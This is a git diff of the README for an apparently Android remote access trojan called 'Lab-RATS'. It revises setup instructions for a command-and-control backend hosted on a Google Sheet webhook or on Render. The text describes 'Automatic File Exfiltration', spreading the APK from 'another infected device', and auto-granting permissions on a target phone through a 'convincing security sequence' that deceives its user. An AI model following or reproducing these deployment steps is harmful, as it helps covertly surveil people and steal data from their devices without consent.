@@ -176,8 +176,7 @@ termux-reload-settings
  />
 </p>
 
-**Lab-RATS** now supports **TWO primary methods** to **track your device fleet**, and **remotely connect/receive data**.
-
+**Lab-RATS** now supports **TWO primary methods** to **Receive Data, Connect Remotely & Track your Devices**,
 ### ☝🏻 Option 1: Google Sheet *(Updated)*
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
 
@@ -236,30 +235,37 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.
 
 > [!IMPORTANT]
-> 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*
+> 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted** *(Get Started Section Below)*.
 
 <details>
   <summary><b>📸 Click to View Google Sheet Reporting Example</summary></b>
-  <br><p align="center">
-  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="90%">
+  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
 
 ### ✌🏻 NEW! Option 2: Tactical Node.js Backend *(Upgraded)*
-**Best for newer devices running Android 17, professional fleet management** and **Automatic File Exfiltration**.
+**Best for newer devices running Android 17, Professional Fleet Management** & **Automatic File Exfiltration**.
 
 **1. Fork the Lab-RATS-v1.6 repository**.
-<br>**2. Create a new Web Service on <a href="https://render.com" target="_blank">Render.com</a>** and **connect your forked Lab-RATS repo**.
-<br>**3. Set the Root Directory** to /c2-server.
-<br>**4. Set the Build Command** to `npm install`.
-<br>**5. Set the Start Command** to `npm start`.
-<br>**6. Deploy!** Once live, **copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
+<br>**2. Create a new Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
+<br>**3. Once connected, Set the Root Directory** to `c2-server/`
+<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
+<br>**5. Deploy!**
+
+> [!IMPORTANT]
+> Once live, **copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
+<details>
+  <summary><b>📸 Click to View Render Setup</summary></b>
+  <br>
+  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
+  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
+  </details>
 
 <details>
   <summary><b>📸 Click to View Render C2 Screenshot</summary></b>
   <br>
-  <img src="https://github.com/user-attachments/assets/1d97c7de-2c64-45ff-8653-9c3c0ac2c772" alt="Full Web Page Screenshot" width="90%">
+  <img src="https://github.com/user-attachments/assets/1d97c7de-2c64-45ff-8653-9c3c0ac2c772" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 **Advantages of Option 2**:
@@ -322,7 +328,6 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 
 <details>
   <summary><b>📸 Click to View APK-Builder screenshot</summary></b>
-  <br><p align="center">
   <img src="https://github.com/user-attachments/assets/8cb583e6-6c59-46cf-8f94-668f0a34b74e" alt="Full Web Page Screenshot" width="60%">
 </details>
 
@@ -342,7 +347,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 *   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.
 
 #### C. Installation & Initialization:
-Once the **Target device** downloads the **APK**:
+Once the **target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
 2.  **NEW! 'One-Click' Permission Granting (CRITICAL)**: **Open the app ONCE**. **Only the initial pop-up *(Accessibility Services)* must be manually toggled on**, **ALL other permissions are now auto-granted by the system** using a **convincing security sequence**.
 -  -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
